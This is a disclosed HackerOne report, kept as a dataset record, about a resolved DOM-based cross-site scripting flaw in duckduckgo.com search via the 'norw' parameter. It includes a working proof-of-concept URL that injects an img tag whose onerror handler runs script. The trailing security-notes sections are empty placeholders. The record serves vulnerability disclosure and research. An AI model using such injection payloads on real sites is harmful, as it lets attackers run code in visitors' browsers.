---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '868934'
original_report_id: '868934'
title: DOM XSS on duckduckgo.com search
team_handle: duckduckgo
created_at: '2020-05-08T11:43:41.859Z'
disclosed_at: '2020-06-14T11:37:58.627Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 318
asset_identifier: '*.duckduckgo.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
---

# DOM XSS on duckduckgo.com search

## Metadata

- HackerOne Report ID: 868934
- Weakness: 
- Program: duckduckgo
- Disclosed At: 2020-06-14T11:37:58.627Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hello, 
The is a DOM XSS vulnerability on https://duckduckgo.com search through the ```norw``` parameter.

PoC URL:  ```https://duckduckgo.com/?q=a&norw="><img src=/ onerror=alert(document.domain)>```

Screenshot: {F820482}

## Impact

The attacker can execute JS code.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
